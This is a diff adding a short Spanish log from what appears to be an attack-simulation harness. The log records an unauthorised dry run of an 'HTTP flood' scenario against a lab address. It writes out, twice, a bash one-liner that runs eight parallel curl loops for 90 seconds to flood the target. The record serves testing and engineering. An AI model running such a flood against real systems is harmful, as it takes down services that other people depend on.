@@ -1,0 +1,7 @@
+{"rep": "SIM", "estado": "simulado", "fin_utc": "2026-11-01T03:02:26.426190+00:00"}
+rc=0
+{"evento": "episodio_tecnico_lanzado", "rep": "SIM", "autorizado": false, "reloj": {"pared_utc": "2026-11-01T03:02:26.424914+00:00", "monotonico": 112208.71021}}
+{"evento": "inicio", "campana": "paso2-tecnico-motor-20261101T0254Z (prueba de ingenieria; NO es la campana A)", "episodio_id": "inundacion_http-rSIM", "escenario": "inundacion_http", "repeticion": "SIM", "destino": "10.10.30.10", "servicio": "TCP/80", "comando": ["bash", "-c", "fin=$((SECONDS+90)); n=8; d=$(mktemp -d); for i in $(seq $n); do ( c=0; while [ $SECONDS -lt $fin ]; do curl -s -o /dev/null --max-time 2 http://10.10.30.10/ ; c=$((c+1)); done; echo $c > \"$d/$i\" ) & done; wait; echo \"intentos=$(cat \"$d\"/* | awk '{s+=$1} END{print s+0}')\"; rm -rf \"$d\""], "timeout_s": 150, "reloj": {"pared_utc": "2026-11-01T03:02:26.425811+00:00", "monotonico": 112208.711096}}
+paso2-tecnico-motor-20261101T0254Z (prueba de ingenieria; NO es la campana A)
+['bash', '-c', 'fin=$((SECONDS+90)); n=8; d=$(mktemp -d); for i in $(seq $n); do ( c=0; while [ $SECONDS -lt $fin ]; do curl -s -o /dev/null --max-time 2 http://10.10.30.10/ ; c=$((c+1)); done; echo $c > "$d/$i" ) & done; wait; echo "intentos=$(cat "$d"/* | awk \'{s+=$1} END{print s+0}\')"; rm -rf "$d"']
+procesos curl: 0
